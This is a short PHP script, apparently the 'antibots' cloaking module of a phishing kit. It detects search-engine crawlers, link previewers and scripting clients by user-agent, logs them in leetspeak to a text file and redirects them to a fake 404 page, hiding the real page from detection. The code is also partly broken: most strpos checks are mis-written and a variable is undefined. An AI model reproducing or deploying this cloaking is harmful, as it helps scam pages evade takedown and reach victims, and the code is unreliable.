<?php



if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
			$message = " D3cl!n3d =>".$_SERVER['HTTP_USER_AGENT']." [ S0m3B0ts ] \r\n";
		    $save=fopen("antibots/DiscoveredBot.txt","a+");
		    fwrite($save,$message);
		    fclose($save);
			header("Location: ./404.php");exit();
	}
	$v_agent = $_SERVER['HTTP_USER_AGENT'];
	if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
			$message = (" D3cl!n3d => ".$_SERVER['HTTP_USER_AGENT']." [ D!sc0v3rdB0t ] \n || !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
		    $save=fopen("antibots/DiscoveredBot.txt","a+");
		    fwrite($save,$message);
		    fclose($save);
			header("Location: ./404.php");exit();


	}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
	$message = (" D3cl!n3d => ".$_SERVER['HTTP_USER_AGENT']." [ D!sc0v3rdB0t ] \n || !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
		    $save=fopen("antibots/DiscoveredBot.txt","a+");
		    fwrite($save,$message);
		    fclose($save);
			header("Location: ./404.php");exit();
}



